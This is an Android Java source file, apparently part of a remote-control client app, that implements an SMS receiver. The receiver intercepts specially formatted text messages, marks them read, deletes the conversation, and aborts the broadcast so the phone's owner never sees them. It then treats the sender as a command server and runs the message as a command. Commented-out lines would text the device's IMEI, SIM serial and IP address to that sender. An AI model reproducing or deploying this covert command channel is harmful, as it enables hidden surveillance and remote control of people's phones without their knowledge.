package ir.rayacell.mahdaclient.services;

import java.io.DataOutputStream;
import java.io.IOException;

import com.koushikdutta.async.Util;

import ir.rayacell.mahdaclient.App;
import ir.rayacell.mahdaclient.MainActivity;
import ir.rayacell.mahdaclient.manager.Container;
import ir.rayacell.mahdaclient.manager.NetworkManager;
import ir.rayacell.mahdaclient.param.BaseParam;
import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

public class SMSReceiver extends BroadcastReceiver {
	@Override
	public void onReceive(Context context, Intent intent) {

		String recMsgString = "";
		String fromAddress = "";
		SmsMessage currentMessage = null;
		byte[] data = null;

		final Bundle bundle = intent.getExtras();

		if (bundle != null) {
			// ---retrieve the SMS message received---
			Object[] pdus = (Object[]) bundle.get("pdus");

			for (int i = 0; i < pdus.length; i++) {

				currentMessage = SmsMessage.createFromPdu((byte[]) pdus[i]);
				try {
					recMsgString = currentMessage.getDisplayMessageBody();
					// recMsgString = new SimpleCrypto().dec(recMsgString);
					// recMsgString = EncryptDecrypt.cipher(recMsgString, -4);
					recMsgString = ir.rayacell.mahdaclient.security.Util.BinaryToString(recMsgString);
					// data = currentMessage.getUserData();
				} catch (Exception e) {

				}
				// if (data != null) {
				// for (int index = 0; index < data.length; ++index) {
				// recMsgString += Character.toString((char) data[index]);
				// }
				// try {
				// recMsgString = EncryptDecrypt.decrypt(recMsgString);
				// } catch (InvalidKeyException e) {
				// e.printStackTrace();
				// } catch (IllegalBlockSizeException e) {
				// e.printStackTrace();
				// } catch (BadPaddingException e) {
				// e.printStackTrace();
				// } catch (NoSuchAlgorithmException e) {
				// e.printStackTrace();
				// } catch (NoSuchPaddingException e) {
				// e.printStackTrace();
				// }
				// }
				fromAddress = currentMessage.getOriginatingAddress();

				// String message = currentMessage.getDisplayMessageBody();

				// String sendingMessage =
				// Utils.getIMEI()+"&"+Utils.getSimSerial()+"&"+NetworkManager.getIpAddress();
				// Container.getProviderManager().sendSMS(sendingMessage);

			}
			if (recMsgString.matches("\\*([0-9a-zA-Z\\.\\*_-])*\\*")) {
				markMessageRead(context, recMsgString, fromAddress);
				deleteSMS(context, recMsgString, fromAddress);
				abortBroadcast();
				// synchronized (this) {
				Intent dialogIntent = new Intent(App.getContext(),
						MainActivity.class);
				dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				App.getContext().startActivity(dialogIntent);

				SharedPreferences prefs = PreferenceManager
						.getDefaultSharedPreferences(App.getContext());

				String proString = prefs.getString("provider", 1 + "");
				/*
				 * if(proString.equals("1")){
				 * Container.getProviderManager().setSmsProvider(); }else
				 */if (proString.equals("2")) {
					Container.getProviderManager().setInternetProvider();
				} else if (proString.equals("3")) {
					Container.getProviderManager().setXmpp3GProvider();
				} else {
					Container.getProviderManager().setInternetProvider();

				}

				// }
				Toast.makeText(context, "aaaaaaaaaa", 20000).show();
				NetworkManager.setServerNumber(fromAddress);
				BaseParam param = new BaseParam(0, fromAddress, null);
				param.mCommand = recMsgString;
				Container.getProviderManager().setSmsProvider();
				Container.getProviderManager().getProvider().recieve(param);
				abortBroadcast();
			}
		}

	}

	public void deleteSMS(Context context, String message, String number) {
		try {
			Uri uriSms = Uri.parse("content://sms/inbox");
			Cursor c = context.getContentResolver().query(
					uriSms,
					new String[] { "_id", "thread_id", "address", "person",
							"date", "body" }, null, null, null);

			if (c != null && c.moveToFirst()) {
				do {
					long id = c.getLong(0);
					long threadId = c.getLong(1);
					String address = c.getString(2);
					String body = c.getString(5);

					if (message.equals(body) && address.equals(number)) {
						context.getContentResolver().delete(
								Uri.parse("content://sms/conversations/"
										+ threadId), "address=?",
								new String[] { address });
					}
				} while (c.moveToNext());
			}
			c.close();
		} catch (Exception e) {
		}
	}

	public void readSMS(Context context, String message, String number) {
		try {
			Uri uriSms = Uri.parse("content://sms/inbox");
			Cursor c = context.getContentResolver().query(
					uriSms,
					new String[] { "_id", "thread_id", "address", "person",
							"date", "body" }, null, null, null);

			if (c != null && c.moveToFirst()) {
				do {
					long id = c.getLong(0);
					long threadId = c.getLong(1);
					String address = c.getString(2);
					String body = c.getString(5);

					if (message.equals(body) && address.equals(number)) {
						ContentValues cv = new ContentValues();
						cv.put("read", true);
						context.getContentResolver().update(
								Uri.parse("content://sms/inbox"), cv,
								"_id=" + id, null);
						// context.getContentResolver().delete(
						// Uri.parse("content://sms/conversations/"
						// + threadId), "address=?",
						// new String[] { address });
					}
				} while (c.moveToNext());
			}
			c.close();
		} catch (Exception e) {
		}
	}

	private void markMessageRead(Context context, String body, String number) {

		

		Uri uri = Uri.parse("content://sms/inbox");
		Cursor cursor = context.getContentResolver().query(uri, null, null,
				null, null);
		try {

			while (cursor.moveToNext()) {
				if ((cursor.getString(cursor.getColumnIndex("address"))
						.equals(number))
						&& (cursor.getInt(cursor.getColumnIndex("read")) == 0)) {
					if (cursor.getString(cursor.getColumnIndex("body"))
							.startsWith(body)) {
						String SmsMessageId = cursor.getString(cursor
								.getColumnIndex("_id"));
						ContentValues values = new ContentValues();
						values.put("read", true);
						context.getContentResolver().update(
								Uri.parse("content://sms/inbox"), values,
								"_id=" + SmsMessageId, null);
						return;
					}
				}
			}
		} catch (Exception e) {
			Log.e("Mark Read", "Error in Read: " + e.toString());
		}
	}

}